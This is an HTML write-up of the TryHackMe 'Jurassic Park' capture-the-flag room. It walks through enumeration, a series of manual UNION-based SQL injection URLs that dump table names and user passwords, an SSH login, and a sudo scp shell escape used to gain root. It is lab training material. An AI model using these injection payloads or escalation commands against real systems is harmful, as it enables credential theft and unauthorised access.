<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>jurassic park ctf</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>jurassic park ctf</h1><br/><strong><h1>THM:Jurassic Park CTF</h1></strong><br /><br /><strong>Link to Room:</strong> <a href="https://tryhackme.com/room/jurassicpark">https://tryhackme.com/room/jurassicpark</a><br /><br /><br /><strong><h2>Enumeration</h2></strong><br /><br /><br /><strong><h4>Rustscan &amp; Nmap:</h4></strong><br /><img src="images/47-1.png" alt="images/47-1.png" /><br /><br />There are 2 Open ports. 22(SSH) &amp; 80(Web Server)<br /><br /><strong><h4>Website Enumeration:</h4></strong><br /><img src="images/47-2.png" alt="images/47-2.png" /><br /><br />We click on the “online shop” link to get a page with 3 buying options. I clicked on one of the options and recorded the URL. (Intresting)<br /><img src="images/47-3.png" alt="images/47-3.png" /><br /><br /><strong>URL:</strong> <strong>http://10.10.116.18/item.php?id=1</strong><br /><br />I played around the <strong>id</strong> parameter and could access all 3 options using id=1, id=2, id=3. It seems the site is running a database in the background. Lets enumerate this website with <strong>dirsearch</strong> to find other endpoints.<br /><br /><img src="images/47-4.png" alt="images/47-4.png" /><br /><br />The error shows that MySQL Server is running.<br /><br /><strong><h4>Dirsearch:</h4></strong><br /><img src="images/47-5.png" alt="images/47-5.png" /><br /><br /><strong><h4>Website Enumeration(Continued):</h4></strong><br /><br />I looked into assests page. It did not have any useful information.<br /><br /><strong>/robots.txt</strong><br /><img src="images/47-6.png" alt="images/47-6.png" /><br /><br /><br /><br />We found a random string.<br /><br />/index.php/login → Did not open up any login pages. It was a dead end.<br /><br /><br />I then tried enumerating using <strong>gobuster</strong> to include a more bigger wordlist.<br /><br /><strong><h4>Gobuster:</h4></strong><br /><img src="images/47-7.png" alt="images/47-7.png" /><br /><br />I found 1 additional directory path.<br /><strong>/delete</strong><br /><img src="images/47-8.png" alt="images/47-8.png" /><br /><br />Now we get confirmatio that <strong>MySQL</strong> is running on the system.<br /><br /><br /><strong><h3>Manual SQL Injection:</h3></strong><br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1</strong><br /><img src="images/47-9.png" alt="images/47-9.png" /><br /><br />The output shows we are on the correct path. We just need to increase the columns till we don&#39;t get the error.<br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2</strong><br /><img src="images/47-10.png" alt="images/47-10.png" /><br /><br />Finally, we are lucky by selecting 5 rows. We get output.<br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,4,5</strong><br /><img src="images/47-11.png" alt="images/47-11.png" /><br /><br />I finally got the output by using UNION of 5 colomns. Also we have <strong>4 fields</strong> to <strong>display</strong> our <strong>SQL commands output</strong>.<br />I will however use one one field. <strong>Lets take 4</strong><br /><br />So To get the database name. I will use the following URL.<br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,version(),5</strong><br /><img src="images/47-12.png" alt="images/47-12.png" /><br /><br />We get some System Information Along with Database version: <strong>5.7.25-0ubuntu0.16.04.2</strong><br />THM Answer: <strong>ubuntu16.04</strong><br /><br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,database(),5</strong><br /><img src="images/47-13.png" alt="images/47-13.png" /><br /><br />We found the answer to the first question of the room.<br /><br /><strong>Challenge:</strong><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,table_name,5 FROM information_schema.tables WHERE table_schema=&#39;park</strong>&#39;<br /><br />Upon using the above URL. We got a error that was stopping us from enumerating.<br /><img src="images/47-14.png" alt="images/47-14.png" /><br /><br /><br />With a message at the bottom of the page: <strong>Try SqlMap.. I dare you..</strong><br />This just means that SQLMAP won&#39;t work. I tried it though and it didn&#39;t work.<br /><br /><strong>Research:</strong><br />I did a bit hit and try and found that “ ” is working and escaping the filter the website is using. I think Sqlmap did not work because maybe it uses single quotes of enumeration, but the website is blocking it.<br /><br /><strong>Solution to Challenge:</strong> Use “park&quot; double quotes<br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(table_name),5 FROM information_schema.tables WHERE table_schema=&quot;park&quot;</strong><br /><img src="images/47-15.png" alt="images/47-15.png" /><br /><br />We got the table name: <strong>items &amp; users</strong><br />Now, Lets check the column names of the each table.<br /><br /><strong><h3>Enumerating Users Table:</h3></strong><br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(column_name),5 FROM information_schema.columns WHERE table_name=&quot;users&quot;</strong><br /><img src="images/47-16.png" alt="images/47-16.png" /><br /><br />It seems the <strong>users</strong> table has <strong>6</strong> columns. <br />(But the Tryhackme Room answer is 5 Columns becuase the question refers to the <strong>items</strong> table. Check &quot;<strong>Enumerating Items Table:</strong>&quot; section after this enumeration.)<br /><br />I then moved to list the contents of each column. I found the id &amp; password column did work. But username column was again filtered.<br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(id),5 FROM park.users</strong><br /><img src="images/47-17.png" alt="images/47-17.png" /><br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(password),5 FROM park.users</strong><br /><img src="images/47-18.png" alt="images/47-18.png" /><br /><br />Thus, we find 2 passwords. <strong>Note</strong> it for future use.<br /><br /><br />But we get checked by the filter for the <strong>username</strong> column<br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(username),5 FROM park.users</strong><br /><img src="images/47-19.png" alt="images/47-19.png" /><br /><br />Moving on.<br /><br /><strong><h3>Enumerating Items Table:</h3></strong><br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(column_name),5 FROM information_schema.columns WHERE table_name=&quot;items&quot;</strong><br /><img src="images/47-20.png" alt="images/47-20.png" /><br /><br />We get <strong>5 Columns</strong>, Thus the answer to Tryhackme room is 5<br />Lets enumerate each column.<br /><br /><strong>id column</strong><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,2,3,GROUP_CONCAT(id),5 FROM park.items</strong><br /><img src="images/47-21.png" alt="images/47-21.png" /><br /><br />Seeing the output: There are 5 rows with id - 1,2,3,5,100.<br /><strong>Note:</strong> Only 1,2,3 were displayed in the webpage.<br /><br />As we had 4 display windows. I am going to use all of them to display the contents of the remaining 4 columns. (package,price,information &amp; sold)<br /><br />URL: <strong>http://10.10.116.18/item.php?id=1 UNION SELECT 1,GROUP_CONCAT(package),GROUP_CONCAT(price),GROUP_CONCAT(information),GROUP_CONCAT(sold) FROM park.items</strong><br /><br /><img src="images/47-22.png" alt="images/47-22.png" /><br /><br />In the Information Field, we got intresting data:<br />We get to know a person named: <strong>Dennis</strong><br /><br />Also i see the charecters that are blocked and give the specific permission denied message seen above.<br /><br /><br /><br /><strong><h2>Foothold</h2></strong><br /><br />Since i have 2 Passwords and a Username. I will try SSH login with both the passwords. I successfully logged in using the second one.<br /><br /><img src="images/47-23.png" alt="images/47-23.png" /><br /><br /><strong>User Enumeration:</strong><br /><br /><img src="images/47-24.png" alt="images/47-24.png" /><br /><br />We get the <strong>flag1</strong> in this directory.<br /><img src="images/47-25.png" alt="images/47-25.png" /><br /><br /><br /><strong><h2>Privilege Escalation</h2></strong><br /><br />The user dennis is allowed to run <strong>/usr/bin/scp</strong> as <strong>Sudo</strong>. I use the following commands on the machine. Referencing from <strong>GTFOBins</strong>.<br />(<strong>https://gtfobins.github.io/gtfobins/scp/#sudo</strong>)<br /><br /><br /><strong>TF=$(mktemp)<br />echo &#39;sh 0&lt;&amp;2 1&gt;&amp;2&#39; &gt; $TF<br />chmod +x &quot;$TF&quot;<br />sudo scp -S $TF x y:</strong><br /><br /><img src="images/47-26.png" alt="images/47-26.png" /><br /><br /><strong>Flag2.txt(flagTwo.txt)</strong><br /><img src="images/47-27.png" alt="images/47-27.png" /><br /><br /><strong>Flag3</strong><br /><img src="images/47-28.png" alt="images/47-28.png" /><br /><br /><strong>Flag5.txt</strong><br /><img src="images/47-29.png" alt="images/47-29.png" /><br /><br />Thanks!!</div>
</body>
</html>
